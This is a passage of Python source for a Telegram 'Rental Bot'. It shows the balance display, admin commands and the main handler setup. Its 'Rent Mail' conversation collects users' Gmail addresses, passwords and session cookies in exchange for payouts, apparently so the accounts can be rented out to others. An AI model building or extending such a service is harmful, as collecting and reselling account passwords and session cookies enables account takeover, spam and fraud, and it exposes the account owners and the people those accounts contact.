        target_id = int(context.args[0])
        msg = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=target_id, text=f"📩 **ADMIN MESSAGE:**\n\n{msg}", parse_mode="Markdown")
        await update.message.reply_text(f"✅ Sent to `{target_id}`.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(user_id, context)
        return

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance, payment_address FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()

    bal = row[0] if row else 0.0
    addr = row[1] if row and row[1] else "Not Set"
    await update.message.reply_text(f"💰 **Current Balance:** ₹{bal:.2f}\n📍 **Saved Address:** `{addr}`", parse_mode="Markdown")

# 12. MAIN APP RUNNER
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()

    rent_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^(📧 Rent Mail|Rent Mail)$'), start_rent)],
        states={
            GMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_gmail)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            COOKIES: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_cookies)],
        },
        fallbacks=[]
    )

    update_cookie_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_update_cookies, pattern="^updcookie_")],
        states={
            UPDATE_COOKIES_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_updated_cookies)],
        },
        fallbacks=[]
    )

    address_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('.*Payment Address.*'), start_set_address)],
        states={SET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_payment_address)]},
        fallbacks=[]
    )

    withdraw_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('.*Withdrawal.*'), start_withdrawal)],
        states={WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_withdrawal_amount)]},
        fallbacks=[]
    )

    support_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('.*Support.*'), start_support)],
        states={SUPPORT_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_support_msg)]},
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(rent_conv)
    app.add_handler(update_cookie_conv)
    app.add_handler(address_conv)
    app.add_handler(withdraw_conv)
    app.add_handler(support_conv)

    app.add_handler(CallbackQueryHandler(handle_check_joined, pattern="^check_joined$"))
    app.add_handler(CallbackQueryHandler(handle_submit_later, pattern="^submit_later$"))
    app.add_handler(CallbackQueryHandler(handle_admin_decision, pattern="^(accept|reject|award3h|accupdate|rejupdate|wdaccept|wdreject)_"))

    app.add_handler(MessageHandler(filters.Regex('.*Account Earning History.*'), earning_history))
    app.add_handler(MessageHandler(filters.Regex('.*Balance.*'), show_balance))

    # Admin Handlers
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addbalance", add_main_balance))
    app.add_handler(CommandHandler("removebalance", remove_main_balance))
    app.add_handler(CommandHandler("addtaskbal", add_task_balance))
    app.add_handler(CommandHandler("removetaskbal", remove_task_balance))
    app.add_handler(CommandHandler("activatetask", activate_task))
    app.add_handler(CommandHandler("deactivatetask", deactivate_task))
    app.add_handler(CommandHandler("msg", direct_message))

    # Safe Job Queue Registration
    if app.job_queue:
        app.job_queue.run_repeating(background_timer_job, interval=60, first=10)

    print("Rental Bot starting with Broadcast registered...")
    app.run_polling()
